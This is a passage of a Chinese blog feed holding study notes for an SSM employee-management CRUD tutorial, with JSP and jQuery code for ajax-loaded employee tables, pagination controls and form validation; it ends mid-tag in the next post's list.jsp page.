class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    员工数据等-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示分页信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页文字信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示页码等信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    var totalRecords;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //1.页面加载完成以后，直接去发送一个ajax请求，要到分页数据</span></span><br><span class="line"><span class="xml">    $(function ()&#123;</span></span><br><span class="line"><span class="xml">        //去首页</span></span><br><span class="line"><span class="xml">        to_page(1);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function to_page(pn) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">            data:"pn="+pn,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                //1.解析并显示员工数据</span></span><br><span class="line"><span class="xml">                build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                //2.解析并显示分页信息</span></span><br><span class="line"><span class="xml">                build_page_info(result);</span></span><br><span class="line"><span class="xml">                //3.解析并显示分页条数据</span></span><br><span class="line"><span class="xml">                build_page_nav(result);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">        //清空table</span></span><br><span class="line"><span class="xml">        $("#emps_table tbody").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">        $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">            var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">            var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"男":"女");</span></span><br><span class="line"><span class="xml">            var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">            var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             编辑</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("编辑");</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             删除</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("删除");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //append方法执行完成之后还是返回原来的元素</span></span><br><span class="line"><span class="xml">            $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                .append(empNameTd)</span></span><br><span class="line"><span class="xml">                .append(genderTd)</span></span><br><span class="line"><span class="xml">                .append(emailTd)</span></span><br><span class="line"><span class="xml">                .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                .append(btnTd)</span></span><br><span class="line"><span class="xml">                .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //解析显示分页信息</span></span><br><span class="line"><span class="xml">    function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">        //清空分页信息</span></span><br><span class="line"><span class="xml">        $("#page_info_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        $("#page_info_area").append("当前"+result.extend.pageInfo.pageNum+"页,总"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.pages+"页,总"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.total+"条记录");</span></span><br><span class="line"><span class="xml">        totalRecords = result.extend.pageInfo.total;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //解析显示分页条,点击分页要能去下一页等等....</span></span><br><span class="line"><span class="xml">    function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">        //清空</span></span><br><span class="line"><span class="xml">        $("#page_nav_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //page_nav_area</span></span><br><span class="line"><span class="xml">        var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //构建元素</span></span><br><span class="line"><span class="xml">        var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("首页").attr("href","#"));</span></span><br><span class="line"><span class="xml">        var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasPreviousPage == false)&#123;</span></span><br><span class="line"><span class="xml">            firstPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            prePageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //为元素添加点击翻页的事件</span></span><br><span class="line"><span class="xml">            firstPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            prePageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum-1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //构建元素</span></span><br><span class="line"><span class="xml">        var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">        var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("末页").attr("href","#"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasNextPage == false)&#123;</span></span><br><span class="line"><span class="xml">            nextPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            lastPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //为元素添加点击翻页的事件</span></span><br><span class="line"><span class="xml">            nextPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum+1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            lastPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pages);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //添加首页和前一页的提示</span></span><br><span class="line"><span class="xml">        ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">        //1,2,3....遍历给ul中添加页码提示</span></span><br><span class="line"><span class="xml">        $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">            if(result.extend.pageInfo.pageNum == item)&#123;</span></span><br><span class="line"><span class="xml">                numLi.addClass("active");</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">            numLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(item);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            ul.append(numLi);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //添加后一页和末页的提示</span></span><br><span class="line"><span class="xml">        ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //把ul加入到nav元素中</span></span><br><span class="line"><span class="xml">        var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">        navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //清空表单样式及内容</span></span><br><span class="line"><span class="xml">    function reset_form(ele)&#123;</span></span><br><span class="line"><span class="xml">        $(ele)[0].reset();</span></span><br><span class="line"><span class="xml">        //清空样式</span></span><br><span class="line"><span class="xml">        $(ele).find("*").removeClass("has-success has-error");</span></span><br><span class="line"><span class="xml">        $(ele).find(".help-block").text("");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //点击新增按钮弹出模态框</span></span><br><span class="line"><span class="xml">    $("#emp_add_modal_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //清除数据，表单重置</span></span><br><span class="line"><span class="xml">        reset_form($("#empAddModal form"));</span></span><br><span class="line"><span class="xml">        //发送ajax请求，查出部门信息，显示在下拉列表</span></span><br><span class="line"><span class="xml">        getDepts();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //弹出模态框</span></span><br><span class="line"><span class="xml">        $("#empAddModal").modal(&#123;</span></span><br><span class="line"><span class="xml">            backdrop:"static"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //查出所有的部门信息并显示在下拉列表中</span></span><br><span class="line"><span class="xml">    function getDepts() &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">           url:"$&#123;APP_PATH&#125;/depts",</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                // console.log(result)</span></span><br><span class="line"><span class="xml">                //显示部门信息在下拉列表中</span></span><br><span class="line"><span class="xml">                // $("#dept_add_select").append("")</span></span><br><span class="line"><span class="xml">                $.each(result.extend.depts,function () &#123;</span></span><br><span class="line"><span class="xml">                    var optionEle = $("<span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span>").append(this.deptName).attr("value",this.deptId);</span></span><br><span class="line"><span class="xml">                    optionEle.appendTo("#dept_add_select")</span></span><br><span class="line"><span class="xml">                &#125;);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml">    //校验表单数据</span></span><br><span class="line"><span class="xml">    function validata_add_form()&#123;</span></span><br><span class="line"><span class="xml">        //1. 拿到要检验的数据，使用正则表达式</span></span><br><span class="line"><span class="xml">        var empName = $("#empName_add_input").val();</span></span><br><span class="line"><span class="xml">        var regName = /(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\u2E80-\u9FFF]&#123;2,5&#125;)/;</span></span><br><span class="line"><span class="xml">        if(!regName.test(empName))&#123;</span></span><br><span class="line"><span class="xml">            // alert("用户名可以是2-5位中文或6-16位英文和数字的组合");</span></span><br><span class="line"><span class="xml">            //清空这个元素之前的样式</span></span><br><span class="line"><span class="xml">            show_validate_msg("#empName_add_input","error","用户名可以是2-5位中文或6-16位英文和数字的组合");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#empName_add_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //2. 校验邮箱信息</span></span><br><span class="line"><span class="xml">        var email = $("#email_add_input").val();</span></span><br><span class="line"><span class="xml">        var regEmaill = /^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/ ;</span></span><br><span class="line"><span class="xml">        if(!regEmaill.test(email))&#123;</span></span><br><span class="line"><span class="xml">            // alert("邮箱格式不正确");</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_add_input","error","邮箱格式不正确");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_add_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        return true;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //显示校验信息</span></span><br><span class="line"><span class="xml">    function show_validate_msg(ele,status,msg)&#123;</span></span><br><span class="line"><span class="xml">        //清空这个元素之前的样式</span></span><br><span class="line"><span class="xml">        $(ele).parent().removeClass("has-success has-error");</span></span><br><span class="line"><span class="xml">        $(ele).next("span").text("");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        if(status == "success")&#123;</span></span><br><span class="line"><span class="xml">            $(ele).parent().addClass("has-success");</span></span><br><span class="line"><span class="xml">            $(ele).next("span").text(msg);</span></span><br><span class="line"><span class="xml">        &#125;else if(status == "error")&#123;</span></span><br><span class="line"><span class="xml">            $(ele).parent().addClass("has-error");</span></span><br><span class="line"><span class="xml">            $(ele).next("span").text(msg);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //校验用户名是否可用</span></span><br><span class="line"><span class="xml">    $("#empName_add_input").change(function () &#123;</span></span><br><span class="line"><span class="xml">        //发送ajax请求校验用户名是否可用</span></span><br><span class="line"><span class="xml">        var empName = this.value;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/checkUser",</span></span><br><span class="line"><span class="xml">            data:"empName="+empName,</span></span><br><span class="line"><span class="xml">            type:"POST",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                if(result.code == 200)&#123;</span></span><br><span class="line"><span class="xml">                    show_validate_msg("#empName_add_input","success","用户名可用");</span></span><br><span class="line"><span class="xml">                    $("#emp_save_btn").attr("ajax-va","success");</span></span><br><span class="line"><span class="xml">                &#125;else&#123;</span></span><br><span class="line"><span class="xml">                    show_validate_msg("#empName_add_input","error",result.extend.va_msg);</span></span><br><span class="line"><span class="xml">                    $("#emp_save_btn").attr("ajax-va","error");</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //点击保存，保存员工</span></span><br><span class="line"><span class="xml">    $("#emp_save_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //1.模态框中填写的表单数据提交给服务器进行保存</span></span><br><span class="line"><span class="xml">        //2.先对要提交给服务器的数据进行校验</span></span><br><span class="line"><span class="xml">        if(!validata_add_form())&#123;</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        //3.判断之前的ajax用户名校验是否成功</span></span><br><span class="line"><span class="xml">        if($(this).attr("ajax-va")=="error")&#123;</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        //4.发送ajax请求保存员工</span></span><br><span class="line"><span class="xml">        // alert($("#empAddModal form").serialize());</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emp",</span></span><br><span class="line"><span class="xml">            type:"POST",</span></span><br><span class="line"><span class="xml">            data:$("#empAddModal form").serialize(),</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                //alert(result.msg);</span></span><br><span class="line"><span class="xml">                //员工保存成功：</span></span><br><span class="line"><span class="xml">                //1. 关闭模态框</span></span><br><span class="line"><span class="xml">                $("#empAddModal").modal('hide');</span></span><br><span class="line"><span class="xml">                //2. 来到最后一页，显示刚才保存的数据</span></span><br><span class="line"><span class="xml">                //发送ajax请求显示最后一页数据即可</span></span><br><span class="line"><span class="xml">                //可以将总记录数当作页码</span></span><br><span class="line"><span class="xml">                to_page(totalRecords);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>SSM</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>SSM-2020/10/12-员工管理系统-2</title>
    <url>/2020/10/12/SSM-2020-10-12-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="前端页面"><a href="#前端页面" class="headerlink" title="前端页面"></a>前端页面</h1><p>根据前面的效果图做一个前端页面<br>list.jsp:<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span></span></span></span><br><span class="line"><span class="xml">    web路径：</span></span><br><span class="line"><span class="xml">        不以/开始的相对路径，找资源，以当前资源的路径为基准，经常容易出现问题</span></span><br><span class="line"><span class="xml">        以/开始的相对路径，找资源，以服务器的路径为标准（http://localhost:3306）需要加上项目名</span></span><br><span class="line"><span class="xml">            http://localhost:3306/crud</span></span><br><span class="line"><span class="xml">--%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">uri</span>=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> <span class="attr">prefix</span>=<span class="string">"c"</span>%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>员工列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="xml">        pageContext.setAttribute("APP_PATH",request.getContextPath());</span></span><br><span class="line"><span class="xml">    %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--标题--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--按钮--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>新增<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>删除<span 